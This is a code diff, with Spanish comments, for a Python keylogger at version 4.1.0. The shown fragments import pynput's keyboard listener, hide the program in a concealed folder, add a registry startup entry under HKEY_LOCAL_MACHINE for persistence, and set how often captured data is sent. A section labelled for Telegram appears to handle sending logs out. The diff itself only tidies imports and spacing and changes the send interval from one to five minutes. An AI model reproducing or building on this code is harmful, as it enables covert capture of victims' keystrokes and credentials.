@@ -13,8 +13,7 @@
 # ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v4.1.0
 
 # Librerías Utilizadas
-from pynput.keyboard import Key, Listener
-import pynput
+from pynput.keyboard import Listener
 from getpass import getuser # Obtiene el nombre del usuario
 from datetime import datetime
 from winreg import *
@@ -28,7 +27,7 @@ import shutil
 import string
 import time
 import threading # Hilos
-import socket    # Librería verifica internet 
+import socket    # Librería verifica internet
 
 def addStartup():  # function =  Iniciar automaticamente
     path = GetPathOcult()+ GetNameKey() # Path del Software completo
@@ -42,7 +41,7 @@ def addStartup():  # function =  Iniciar automaticamente
             return False# La carpeta ya existe
     try:    # Solo si tiene permisos de administrador
         registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS) # machine
-        SetValueEx(registry,name, 0, REG_SZ, path)
+        SetValueEx(registry, name, 0, REG_SZ, path)
         verificar() # Crea Carpeta
     except: # Si no tiene permisos de administrador
         if (verificar()):
@@ -486,7 +485,7 @@ def SendMode():
 
 
 def timeSend(): # Tiempo de envío perzonalizado
-    return 1 #Minutos                 <= Escoja su tiempo en minutos
+    return 5 #Minutos                 <= Escoja su tiempo en minutos
 
 # ************ Zone Telegram *************     
 def ID():
